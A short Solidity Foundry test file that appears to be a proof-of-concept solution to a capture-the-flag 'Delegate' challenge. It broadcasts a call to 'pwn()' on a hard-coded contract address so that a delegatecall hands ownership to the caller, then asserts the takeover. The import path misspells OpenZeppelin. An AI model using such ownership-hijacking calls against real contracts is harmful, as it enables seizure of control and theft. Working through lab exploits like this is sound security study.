// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "@oppenzeppelin/contracts/access/Ownable.sol";

address constant INSTANCE = 0xD6A8567e059Be68ce4d869c65Bbca3E134af7Be1;

contract DelegatePOCTest is Test {
    function setUp() external {
        vm.label(INSTANCE, "Delegate");
    }

    function test() external {
        assertNotEq(Ownable(INSTANCE).owner(), msg.sender);

        vm.broadcast();
        (bool success,) = address(INSTANCE).call(abi.encodeWithSignature("pwn()"));
        assertTrue(success);

        assertEq(Ownable(INSTANCE).owner(), msg.sender);
    }
}